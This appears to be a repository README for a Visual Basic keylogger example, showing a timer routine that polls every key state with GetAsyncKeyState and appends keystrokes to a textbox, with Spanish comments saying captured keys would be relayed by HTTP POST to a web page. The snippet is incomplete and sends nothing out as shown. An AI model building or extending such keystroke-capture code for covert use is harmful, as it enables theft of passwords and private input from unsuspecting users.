visualbasic-Keylogger
=====================

Labels
VisualBASIC, VisualStudio, keylogger, jamesjara

Keylogger for vB

Keylogger example in visual basic by james jara

Hooks the inputs of an anyplace and relays the keystrokes.  

```Visualbasic
Private Sub Timer1_Timer()
' el timer detecta cada cierto tiempo la tecla
Dim numerodeteclas As Integer
For numerodeteclas = 0 To 255

'GetAsyncKeyState detecta el estado de la tecla presionada
If GetAsyncKeyState(numerodeteclas) = -32767 Then

'Aqui envia los datos por medio de http post a una pagina web
' ahorita los escirbe en el textbox para ejemplo
Text1.Text = Text1.Text + Chr(numerodeteclas)

End If
```
